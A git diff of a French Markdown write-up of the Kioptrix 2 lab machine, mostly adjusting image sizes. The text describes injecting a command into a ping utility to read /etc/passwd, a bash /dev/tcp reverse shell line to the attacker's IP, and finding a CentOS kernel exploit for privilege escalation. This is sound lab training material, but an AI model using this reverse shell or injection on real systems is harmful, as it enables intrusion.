@@ -56,13 +56,13 @@ Sur la base de la connexion réussie, une page d’utilitaire Ping s’est affic
 </p>
 Alors,on va essayer de concatener la commande ping avec une autre commande ,afin de savoir si notre champs nous permet d'envoyer un reverse shell.
 <p align="center">
-  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/cat_etc_passwd_9.png" width="860" height="170">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/cat_etc_passwd_9.png" width="860" height="220">
 </p>
 Succès,on a réussi à lire le fichier /etc/passwd.donc on va essayer d'anvoyer un reverse shell vers ma machine avec la commande nc 
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/nc_reverse_shell_10.png" width="860" height="170">
 </p>
-je met en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une méthode.\textbf{bash -i >& /dev/tcp/10.0.4.4/1234 0>&1} est une commande qui permet de nous envoyer un reverse shell.
+je met en mode écoute pour un reverse shell,et rien n'est passé.Donc la commande netcat peut etre n'est pas installé,donc il faut essayer avec une méthode.**bash -i >& /dev/tcp/10.0.4.4/1234 0>&1** est une commande qui permet de nous envoyer un reverse shell.
 <p align="center">
   <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/get_reverse_shell_11.png" width="860" height="170">
 </p>
@@ -73,12 +73,12 @@ comme avec l'utilitaire Ping, nous sommes connectés au compte apache,mais on n'
 ###### 3.2 Escalation de privilèges
 continuant avec le shell inversé, je devais rassembler des informations supplémentaires sur le système.
 <p align="center">
-  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/uname_13.png" width="860" height="170">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/uname_13.png" width="860" height="130">
 </p>
 Génial! Maintenant que nous savons que le système d'exploitation était CentOS version 2.6.9–55.\\
 Ensuite, j'ai examiné la base de données searchsploit installée sur le système Kali local pour déterminer s'il existait une vulnérabilité de CentOS de la version 2.6.9–55 du noyau.
 <p align="center">
-  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/metasploit.png" width="860" height="170">
+  <img src="https://rajoul.github.io/my_write_up/image/kioptrix_2/metasploit.png" width="860" height="280">
 </p>
 alors on a trouvé un script en C qui exploite cette vulnérabilité de centos.alors je copier le script dans mon répertoire de travail pour l'éxécuter sur la machine cible.
 <p align="center">
